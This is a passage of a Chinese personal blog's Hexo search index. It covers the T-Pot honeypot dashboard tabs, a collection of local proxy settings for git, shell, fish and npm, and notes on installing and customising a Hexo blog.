Spiderfoot a open source intelligence automation tool. Suricata a Network Security Monitoring engine. Discover界面这个界面是用来过滤包, 所有的数据包都在这里, 然后可以经过左边的筛选出http包头, user-agent等数据, 时间戳等, 右上角就有很方便的设置 Visualize界面那么这个界面用来干啥的呢. 是用来展示可视化界面的, 这里还可以新建一个自定义可视化视图, 例如饼状图, 柱状图等 Dev Tools界面难度太高, 个人认为是大佬们用的, 这里就跳过了吧… Monitoring界面顾名思义, 就知道这个是用来monitor的, 和DashBoard不一样的是, 这里可以监视5个实用工具的状态和硬件信息 Management界面这里就是关于一些设置的东东, 包括了远程主机, 过滤器设置等东西, 用得上的时候再说吧 04 后记emmm, 略显简陋的blog, 大概了解就好, 简单了解以后还是很好上手的. Done 05 后后记安装完以后, 可以用 sudo su 命令切换成root, 默认是Debian, 操作命令就不献丑贴出来的, 更改IP啥的操作都是可以进行的 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>tpot</tag>
        <tag>Honey Pot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代理类集合(持续更新)]]></title>
    <url>%2F2019%2F08%2F17%2Fproxy_in_all%2F</url>
    <content type="text"><![CDATA[00 前言代理的事情是真的烦, 国内的网络环境真是辣鸡, 现在把所有的代理都集合一起, 免得到处找 01 终端代理类参考链接: 让终端走代理的几种方法 如何让终端命令比如apt、这些走代理？ 比较好的方法是proxychains，或者export也可以 export的范围会小一点，但是会更方便 比如wget、curl，proxychains就很万能了，但是每次都要在前面加语句，略为麻烦，主要针对一些不适用 02 fish在 ~/.config/fish/config.fish 中设置，兼容bashrc指令 03 git命令为 git config --global/local http.proxy 'http/socks5://127.0.0.1:1080' git config --global/local https.proxy 'https/socks5://127.0.0.1:1080' 04 shell/bashrc命令为 123alias setproxysocks5='export ALL_PROXY=socks5h://127.0.0.1:10808'alias unsetproxy='unset ALL_PROXY'alias setproxyhttp='export ALL_PROXY=http://127.0.0.1:10888' ##v2ray和curl会有socks5的冲突,从网上找到的参考链接里可以发现，我们加上socks5h就可以了 对于 socks5 和 socks5h 的区别： socks5h: the hostname is resolved by the SOCKS server (also known as CURLPROXY_SOCKS5_HOSTNAME type);socks5: the hostname is resolved locally; 也就是说socks5适合本地能够解析目标主机域名(比如github.com)但是访问速度慢,来提高下载速度socks5h用与本地不能解析目标主机域名(比如google),由代理服务器解析目标主机域名 05 npm12npm config set proxy http://server:portnpm config set https-proxy http://server:port 待补充 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Network</category>
        <category>Continuously Update</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
        <tag>Continuously Update</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo安装后续2]]></title>
    <url>%2F2019%2F08%2F17%2Fhexo_installation_2%2F</url>
    <content type="text"><![CDATA[00 前言继无限折腾后, 终于把博客弄成了自己喜欢的模样, 赞一个! 01 折腾事项折腾了许多东东, 不过最着急的是版本太新, 自己找不到地方可以调整的, 只能换成旧版5.x的虽然7.x版本的新特性很多, 也很方便, 但教程始终不多, 还特别多误导, 网上的教程除了抄还是抄拥有阅读官方文档的能力很重要也就是我英语得抓紧学了 02 优化项目bgm, bg picture, copyright, code copy, icp等等, 都加上去了 03 博客迁移计划啊, 心态巨崩, 看我怎么把我的旧博客迁移回来, 包括了图片,最重要的还是要重新整理, 心态巨崩 新版博客计划: 取消掉过多的参考链接, 参考链接均详细描述 进行详细tag标志, 以及categories分类 对于未完成的blog进行持续更新tag和categories, 完成后进行删除 后续新增英文blog计划 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客安装进行时]]></title>
    <url>%2F2019%2F08%2F16%2Fhexo_installation%2F</url>
    <content type="text"><![CDATA[00 前言换博客, 辣鸡wordpress 01 安装本机安装git, Node.js设置npm代理: 12npm config set proxy http://server:portnpm config set https-proxy http://server:port 然后打开cmd 运行npm install -g hexo 安装hexo新建一个文件夹，如MyBlog进入该文件夹内，右击运行git，输入：hexo init（生成hexo模板, 从GitHub上download下来） 生成完模板，运行npm install最后运行：hexo server （运行程序，访问本地localhost:4000可以看到博客已经搭建成功） 02 图片测试用, 放在source/upload_image使用的时候就/upload_image 03 音乐参考网易云的mp3链接:http://music.163.com/song/media/outer/url?id=ID数字.mp3通过分享的审查元素可以找到图片最后的\themes\next\source\dist\music.js格式为: 123456{ name: "", artist: '', url: 'http://music.163.com/song/media/outer/url?id=.mp3', cover: '',} 04 美化这里美化直接百度吧, 注意版本为NexT6.x以上 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
